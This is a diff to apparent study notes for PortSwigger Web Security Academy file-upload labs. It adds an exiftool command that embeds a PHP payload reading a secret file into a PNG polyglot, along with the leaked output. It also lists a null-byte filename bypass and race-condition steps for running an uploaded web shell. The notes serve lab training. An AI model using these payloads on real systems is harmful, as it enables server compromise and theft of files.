@@ -970,12 +970,16 @@
   - Browse: https://0aad0062048b502c8543289b001c008d.web-security-academy.net/files/avatars/exploit.l33t
 - Web shell upload via **obfuscated file extension**
   - Content-Disposition: form-data; name="avatar"; filename="**exploit.php%00.jpg**"   
-- Remote code execution via polyglot **web shell upload**   
-- Web shell upload via **race condition**
+- Remote code execution via polyglot **web shell upload**
+  - Install [exiftool](https://exiftool.org/install.html)   
+    Add system environment variables path -> C:\exiftool-12.89_32  > rename to "exiftool.exe" > add a profile.png image into the folder
+  - `exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" profile.png -o polyglot.php`
+  - browse the uploaded file >  PNG  IHDR{  * dStEXtCommentSTART **thIqb3Mm93Qqs0jr8Cl2kEv2E7r3xDp1** ENDԴ`PA I
+- Web shell upload via **race condition (Expert)**
   - The uploaded file is moved to an accessible folder, where it is checked for viruses. Malicious files are only removed once the virus check is complete. This means it's possible to execute the file in the small time-window before it is removed
   - Send repeater for POST /my-account/avatar & GET /files/avatars/exploit.php request   
-  - in POST request > add tab to group > create new group > add GET request   
-  - send group in parallel    
+  - in POST request > **add tab to group > create new group** > add GET request   
+  - **send group in parallel**    
 
 ## Race Condition
 Content for Race Condition...
